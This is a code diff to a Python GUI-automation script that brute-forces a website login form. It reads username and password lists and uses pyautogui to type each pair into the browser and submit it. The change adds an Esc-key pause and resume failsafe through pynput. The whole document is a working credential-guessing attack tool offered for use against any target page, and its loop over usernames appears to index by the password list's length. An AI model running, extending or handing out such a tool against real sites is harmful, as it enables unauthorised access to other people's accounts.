@@ -1,6 +1,7 @@
 import pyautogui as py
 import time
 import os
+from pynput import keyboard
 
 #imported code initial grapix
 from name_grapix import name
@@ -11,6 +12,14 @@ if n in ['Y','y']:
 else:
     exit()
 
+#Execution failsafe control
+breaker=False
+
+#Failsafe
+def failsafe(key):
+    global breaker
+    if key==keyboard.Key.esc:
+        breaker=True
 
 #defined most useed commands as a function
     
@@ -77,32 +86,47 @@ def position_getter():
 
 #main bruteforcer function for tabber mode
 def bruteforcer():
-    with open(pass_word, 'r', newline="") as csvfile:
-        with open(user_word,'r',newline='') as csvuser:
-            content = csvfile.readlines() 
-            usertry=csvuser.readlines()
-            print("Keep ur mouse over the bruteforce site browser\nOpening the bruteforce target page in 10s")
-            time.sleep(10)
-            py.click()
-            for i in range(len(content)):
-                cur_user=usertry[i]
-                for j in range(len(content)):
-                    cur_pass=content[j]
-                    print(cur_user,"\n",cur_pass)
-                    if mover():
-                        time.sleep(.01)
-                        py.write(cur_user)
-                        time.sleep(.01)
-                        if mover():
-                            time.sleep(.01)
-                            py.write(cur_pass[0:-1])
-                            #py.click(submitpos[0][0],submitpos[0][1])
-                            #time.sleep(3)
-                            #py.click(submitpos[0][0],submitpos[0][1])
-                            if mover():
-                                py.press("enter")
-                                time.sleep(.2)
-                            print(i)
+    global breaker
+    with keyboard.Listener(on_press=failsafe) as listener:
+        if not breaker:
+            with open(pass_word, 'r', newline="") as csvfile:
+                with open(user_word,'r',newline='') as csvuser:
+                    content = csvfile.readlines() 
+                    usertry=csvuser.readlines()
+                    print("Keep ur mouse over the bruteforce site browser\nOpening the bruteforce target page in 10s")
+                    time.sleep(10)
+                    py.click()
+                    for i in range(len(content)):
+                        cur_user=usertry[i]
+                        for j in range(len(content)):
+                            if not breaker:
+                                cur_pass=content[j]
+                                print(cur_user,"\n",cur_pass)
+                                if mover():
+                                    time.sleep(.01)
+                                    py.write(cur_user)
+                                    time.sleep(.01)
+                                    if mover():
+                                        time.sleep(.01)
+                                        py.write(cur_pass[0:-1])
+                                        #py.click(submitpos[0][0],submitpos[0][1])
+                                        #time.sleep(3)
+                                        #py.click(submitpos[0][0],submitpos[0][1])
+                                        if mover():
+                                            py.press("enter")
+                                            time.sleep(.2)
+                                            print(i)
+                            else:
+                                resume=input("Press Enter Key to resume type exit to exit")
+                                if resume not in ["EXIT","Exit","exit"]:
+                                    print("Resuming in 10s")
+                                    time.sleep(10)
+                                    breaker=False
+                                else:
+                                    break
+
+
+        listener.join()
 
 
 #main bruteforcer function for position clicker mode
